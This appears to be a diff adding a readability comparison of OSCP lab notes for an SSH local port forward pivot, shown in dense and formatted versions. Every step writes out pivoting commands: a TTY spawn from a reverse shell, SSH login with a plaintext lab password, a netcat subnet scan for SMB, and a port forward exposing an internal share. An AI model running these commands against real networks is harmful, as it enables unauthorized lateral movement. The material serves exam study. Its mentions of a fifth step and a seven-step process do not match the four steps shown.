@@ -1,0 +1,34 @@
+READABILITY COMPARISON - Scenario 2 (SSH Local Port Forward)
+=============================================================
+
+BEFORE (Original - Dense Wall of Text)
+---------------------------------------
+Step 1: From CONFLUENCE01 reverse shell, spawn TTY: python3 -c 'import pty; pty.spawn("/bin/sh")'. Step 2: Enumerate PGDATABASE01 interfaces: ssh database_admin@10.4.50.215 (password: sqlpass123), run ip addr (confirms 172.16.50.215 interface). Step 3: Discover HRSHARES: for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done (finds 172.16.50.217:445 open). Step 4: Exit SSH, create local port forward: ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215.
+
+AFTER (Formatted - Scannable Structure)
+----------------------------------------
+Step 1: From CONFLUENCE01 reverse shell, spawn TTY:
+  python3 -c 'import pty; pty.spawn("/bin/sh")'.
+Step 2: Enumerate PGDATABASE01 interfaces:
+  ssh database_admin@10.4.50.215 (password: sqlpass123), run ip addr (confirms 172.16.50.215 interface).
+Step 3: Discover HRSHARES:
+  for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done (finds 172.16.50.217:445 open).
+Step 4: Exit SSH, create local port forward:
+  ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215.
+
+BENEFITS:
+---------
+1. Each step is visually distinct (easy to find "Step 3")
+2. Commands are indented (copy-paste ready)
+3. Descriptions stay with their steps (context preserved)
+4. White space guides the eye (no cognitive overload)
+
+OSCP EXAM RELEVANCE:
+-------------------
+During time-pressure scenarios, being able to quickly scan and locate
+"Step 5: Verify listening port" is critical. The formatted version
+reduces mental parsing time from ~5 seconds to <1 second per step.
+
+For a 7-step process, that's 28 seconds saved - enough time to check
+enumeration output or verify a flag format.
+
